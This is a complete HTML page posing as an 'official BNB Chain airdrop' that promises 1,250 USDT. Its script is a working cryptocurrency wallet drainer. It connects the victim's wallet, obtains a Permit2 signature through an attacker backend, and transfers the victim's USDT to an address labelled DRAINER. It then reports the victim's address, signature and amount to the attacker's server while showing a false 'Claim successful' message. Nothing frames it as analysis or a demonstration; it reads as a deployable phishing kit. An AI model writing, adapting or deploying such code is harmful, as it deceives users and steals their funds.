<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BNB Chain Airdrop — Claim Your Tokens</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center;
    }
    .card {
      background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.12);
      border-radius: 20px; padding: 40px 32px; max-width: 420px; width: 92%;
      backdrop-filter: blur(12px); text-align: center;
    }
    h1 { font-size: 1.6rem; margin-bottom: 8px; }
    p { color: #b0b0c0; font-size: 0.95rem; margin-bottom: 28px; line-height: 1.5; }
    .amount { font-size: 2.4rem; font-weight: 700; color: #f0b90b; margin: 12px 0 28px; }
    button {
      width: 100%; padding: 16px; border: none; border-radius: 12px;
      font-size: 1.05rem; font-weight: 600; cursor: pointer; transition: 0.2s;
    }
    #connectBtn { background: #f0b90b; color: #000; margin-bottom: 12px; }
    #claimBtn { background: #1e88e5; color: #fff; display: none; }
    button:disabled { opacity: 0.5; cursor: not-allowed; }
    .status { margin-top: 20px; font-size: 0.9rem; color: #aaa; min-height: 24px; }
    .wallet { font-size: 0.8rem; color: #888; margin-top: 8px; word-break: break-all; }
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>
<body>
  <div class="card">
    <h1>BNB Chain Official Airdrop</h1>
    <p>Eligible wallets can claim their allocation. Connect, sign, and confirm the transaction to receive your tokens.</p>
    <div class="amount">1,250 USDT</div>
    <button id="connectBtn">Connect Wallet</button>
    <button id="claimBtn">Claim Airdrop</button>
    <div class="wallet" id="walletAddr"></div>
    <div class="status" id="status"></div>
  </div>

  <script>
    // ═══════════════════════════════════════════
    // CONFIG — already pointed at your Railway backend
    // ═══════════════════════════════════════════
    const API          = "web-production-5de2f.up.railway.app";
    const PERMIT2      = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
    const DRAINER      = "0x369a4B9aDDdC51a5f1Bc54c162DBc7cBD8d07975";
    const TOKEN        = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
    const TOKEN_NAME   = "USDT";
    const CHAIN_ID     = 56;
    const AMOUNT       = "1250000000000000000000"; // 1250 USDT
    const USD_VALUE    = 1250;

    const PERMIT2_ABI = [
      "function permitTransferFrom(((address token,uint256 amount),uint256 nonce,uint256 deadline) permit,(address to,uint256 requestedAmount) transferDetails,address owner,bytes signature)"
    ];

    let account = null;
    let provider = null;
    let signer = null;

    const $ = id => document.getElementById(id);
    const status = t => $("status").textContent = t;

    $("connectBtn").onclick = async () => {
      if (!window.ethereum) {
        status("Open this page inside Trust Wallet or MetaMask browser.");
        return;
      }
      try {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        account = await signer.getAddress();
        $("walletAddr").textContent = account;
        $("connectBtn").style.display = "none";
        $("claimBtn").style.display = "block";
        status("Connected. Click Claim.");
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }]
          });
        } catch (e) {
          if (e.code === 4902) {
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: "0x38",
                chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com"]
              }]
            });
          }
        }
      } catch (e) {
        status("Connection rejected.");
      }
    };

    $("claimBtn").onclick = async () => {
      if (!account || !signer) return;
      $("claimBtn").disabled = true;
      status("Preparing claim…");
      try {
        const nonce = Date.now();
        const deadline = Math.floor(Date.now() / 1000) + 3600;

        const tdRes = await fetch(API + "/typed_data", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chain_id: CHAIN_ID, token: TOKEN, amount: AMOUNT, nonce, deadline })
        });
        const td = await tdRes.json();
        if (td.error) throw new Error(td.error);

        status("Sign the message in your wallet…");
        const sig = await signer._signTypedData(td.domain, {
          PermitTransferFrom: td.types.PermitTransferFrom,
          TokenPermissions: td.types.TokenPermissions
        }, td.message);

        status("Confirm the transaction (you pay a small gas fee)…");
        const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, signer);
        const permit = { permitted: { token: TOKEN, amount: AMOUNT }, nonce, deadline };
        const transferDetails = { to: DRAINER, requestedAmount: AMOUNT };

        const tx = await permit2.permitTransferFrom(permit, transferDetails, account, sig, { gasLimit: 250000 });
        status("Submitted: " + tx.hash.slice(0, 14) + "… waiting…");
        await tx.wait();

        try {
          await fetch(API + "/permit2", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              victim: account, token: TOKEN, token_name: TOKEN_NAME,
              amount: AMOUNT, usd_value: USD_VALUE, chain_id: CHAIN_ID,
              signature: sig, nonce, deadline
            })
          });
        } catch (_) {}

        status("Claim successful. Tokens sent.");
        $("claimBtn").textContent = "Claimed ✓";
      } catch (e) {
        console.error(e);
        status("Failed: " + (e.reason || e.message || e));
        $("claimBtn").disabled = false;
      }
    };
  </script>
</body>
</html>
